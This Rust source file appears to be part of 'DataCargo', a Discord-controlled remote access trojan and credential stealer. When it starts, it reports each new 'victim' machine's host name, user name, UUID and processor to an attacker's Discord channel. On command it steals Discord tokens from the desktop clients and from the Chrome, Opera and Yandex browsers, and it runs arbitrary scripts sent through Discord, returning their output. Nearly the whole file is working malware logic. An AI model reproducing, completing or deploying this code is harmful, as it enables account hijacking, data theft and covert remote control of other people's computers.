const VERSION: &'static str = env!("CARGO_PKG_VERSION");
const EMBED_COLOUR: u32 = 0x2f3136;

extern crate serenity;
extern crate tokio;

mod functions;
mod data;

use serenity::async_trait;
use serenity::client::{Client, Context, EventHandler};
use serenity::model::channel::Message;
use serenity::framework::standard::StandardFramework;
use self::serenity::model::gateway::Ready;
use self::serenity::model::id::ChannelId;
use serenity::utils::Colour;

use std::sync::{Mutex, MutexGuard};
use data::Discord;
use crate::{LOGS_CHANNEL_ID, BOT_TOKEN};


struct Handler {
    selected: Mutex<String>,
    sid: Mutex<String>
}

impl Handler {
    fn new() -> Handler {
        Handler {
            selected: Mutex::new("None".to_string()),
            sid: Mutex::new(functions::generate_sid())
        }
    }

    fn change_selected(&self, new_selected: String) {
        let mut selected: MutexGuard<String> = self.selected.lock().expect("");
        *selected = String::from(new_selected);
    }

    fn get_selected(&self) -> String {
        self.selected.lock().unwrap().to_string()
    }

    fn get_sid(&self) -> String {
        self.sid.lock().unwrap().to_string()
    }
}

#[async_trait]
impl EventHandler for Handler {

    async fn message(&self, context: Context, msg: Message) { unsafe {

        /* SELECT THE VICTIM */
        if msg.content.starts_with(".s") {
            let selected: String = msg.content.replace(".s", "").trim().to_string();
            if selected == self.get_sid() {
                self.change_selected(selected);
                let _ = msg.channel_id.say(&context.http, format!("**SUCCESS!**\nNow working on `{}`", self.get_selected())).await;
            }
        }

        /* GET ALL ACTIVE VICTIMS */
        else if msg.content == ".victims" {
            let sys_inf = functions::get_pc_info();

            let uuid: String;
            let sid: String;
            match functions::uuid_is_protected() {
                true => {
                    uuid = "PROTECTED".to_string();
                    sid = "PROTECTED".to_string();
                },
                false => {
                    uuid = functions::get_uuid();
                    sid = self.get_sid();
                }
            }

            let _ = msg.channel_id.say(&context.http, format!("**{}:** `{}` **||** `{}`", sys_inf.user_nick, sid, uuid)).await;
        }

        // Execute actions if victim is selected
        if self.get_selected() == self.get_sid() {

            /* GET ACTIVE VICTIM */
            if msg.content == ".victim" {
                let sys_inf = functions::get_pc_info();

                let uuid: String;
                let sid: String;
                match functions::uuid_is_protected() {
                    true => {
                        uuid = "PROTECTED".to_string();
                        sid = "PROTECTED".to_string();
                    },
                    false => {
                        uuid = functions::get_uuid();
                        sid = self.get_sid();
                    }
                }

                let _ = msg.channel_id.say(&context.http, format!("**{}:** `{}` **||** `{}`", sys_inf.user_nick, sid, uuid)).await;
            }

            /* GET TOKENS */
            else if msg.content == ".tokens" { tokio::spawn(async move {

                // Init
                let NONE = "None".to_string();

                // Send app data tokens
                let mut message_app = msg.channel_id.say(&context.http, "**Please wait!**\nGetting app tokens...").await.unwrap();
                &context.http.broadcast_typing(msg.channel_id.0).await;
                let _ = message_app.edit(&context.http, |m| {
                    m.content("");
                    m.embed(|e| {
                        e.title("**__Discord App Tokens__**");
                        e.colour(Colour(EMBED_COLOUR));
                        let mut discord = Discord::new();
                        discord.set_paths_app();

                        // Normal
                        if discord.path_normal != NONE {
                            e.field("Discord", format!("```\n{}```", Discord::get_tokens(discord.path_normal)), false);
                        }

                        // Canary
                        if discord.path_canary != NONE {
                            e.field("DiscordCanary", format!("```\n{}```", Discord::get_tokens(discord.path_canary)), false);
                        }

                        // PTB
                        if discord.path_ptb != NONE {
                            e.field("DiscordPTB", format!("```\n{}```", Discord::get_tokens(discord.path_ptb)), false);
                        }

                        e
                    });

                    m
                }).await;

                // Send web data tokens
                let mut message_web = msg.channel_id.say(&context.http, "**Please wait!**\nGetting web tokens...").await.unwrap();
                &context.http.broadcast_typing(msg.channel_id.0).await;
                let _ = message_web.edit(&context.http, |m| {
                    m.content("");
                    m.embed(|e| {
                        e.title("**__Discord Web Tokens__**");
                        e.colour(Colour(EMBED_COLOUR));
                        let mut discord = Discord::new();
                        discord.set_paths_web();

                        // Chrome
                        if discord.path_chrome != NONE {
                            e.field("Chrome", format!("```\n{}```", Discord::get_tokens(discord.path_chrome)), false);
                        }

                        // Opera
                        if discord.path_opera != NONE {
                            e.field("Opera", format!("```\n{}```", Discord::get_tokens(discord.path_opera)), false);
                        }

                        // Yandex
                        if discord.path_yandex != NONE {
                            e.field("Yandex", format!("```\n{}```", Discord::get_tokens(discord.path_yandex)), false);
                        }

                        e
                    });

                    m
                }).await;

            });}

            /* EXECUTE SCRIPT */
            else if msg.content.starts_with(".script") { tokio::spawn(async move {
                &context.http.broadcast_typing(msg.channel_id.0).await;

                let parse_script = || -> Result<Vec<String>,()> {
                    let message_content = msg.content.clone();
                    let content = functions::get_script_content(message_content)?;
                    let output = functions::execute_script(content)?;
                    let output_vec = functions::split_by_lengths(output, 1900)?;
                    Ok(output_vec)
                };

                match parse_script() {
                    Ok(output_vec) => {
                        for data in output_vec {
                            &context.http.broadcast_typing(msg.channel_id.0).await;
                            let _ = msg.channel_id.send_message(&context.http, |m| {
                                m.embed(|e| {
                                    e.colour(Colour(EMBED_COLOUR));
                                    e.description(format!("```\n{}```", data));
                                    e
                                });
                                m
                            }).await;
                        }
                    },
                    Err(()) => {
                        let _ = msg.channel_id.say(&context.http, "**ERROR**\nParsing script failed!").await.unwrap();
                    }
                }
            });}

            /* NEXT COMMAND */
            // else if

        }

    } }

    async fn ready(&self, ctx: Context, ready: Ready) {
        let _ = ready;
        // let cache = ctx.cache.clone();  // unused at the moment
        let http = ctx.http.clone();

        /* SEND NEW VICTIM DATA */
        let _ = ChannelId(LOGS_CHANNEL_ID).send_message(&http, |m| {
            let sys_inf = functions::get_pc_info();

            m.embed(|e| {
                e.title("╔════════╗\n║ New Victim! ║\n╚════════╝");
                e.colour(Colour(EMBED_COLOUR));
                e.author(|a| {
                    a.icon_url("https://cdn.discordapp.com/attachments/735178955958779915/763377463707303946/DataCargo.png");
                    a.name(format!("DataCargo [v{}]", VERSION.clone()));
                    a
                });


                let uuid;
                let sid;
                match functions::uuid_is_protected() {
                    true => {
                        uuid = "PROTECTED".to_string();
                        sid = "PROTECTED".to_string();
                    },
                    false => {
                        uuid = functions::get_uuid();
                        sid = self.get_sid();
                    }
                }


                e.field("SID", format!("```\n{}```", sid), false);
                e.field("UUID", format!("```\n{}```", uuid), false);
                e.field("Host", format!("```\n{}```", sys_inf.pc_name), false);
                e.field("Nickname", format!("```\n{}```", sys_inf.user_nick), false);
                e.field("Name", format!("```\n{}```", sys_inf.user_name), false);
                e.field("Uptime", format!("```\n{} h```", sys_inf.sys_time_up), false);
                e.field("BootTime", format!("```\n{} h```", sys_inf.sys_time_boot), false);
                e.field("Processor", format!("```\n{}```", sys_inf.proc_brand), false);

                e
            });

            m
        }).await;

        // create task
        tokio::spawn(async move {
            // Infinity loop (I will use it for something soon)
            loop {
                tokio::time::delay_for(std::time::Duration::from_millis(100)).await;
            }
        });
    }
}


#[tokio::main]
pub async fn start() {
    let framework = StandardFramework::new()
        .configure(|c| c.prefix("."));

    let token = BOT_TOKEN;
    let mut client = Client::new(token)
        .event_handler(Handler::new())
        .framework(framework)
        .await
        .expect("Error creating client");

    /* Unused */
    // let cache_and_http = client.cache_and_http.clone();
    // tokio::spawn(async move {
    //     let channel = cache_and_http.http.get_channel(760036270239514644).await.unwrap();
    //     println!("{}", channel.to_string());
    //     loop {
    //         tokio::time::delay_for(std::time::Duration::from_millis(100)).await;
    //     }
    // });

    let _ = client.start().await.unwrap();
}
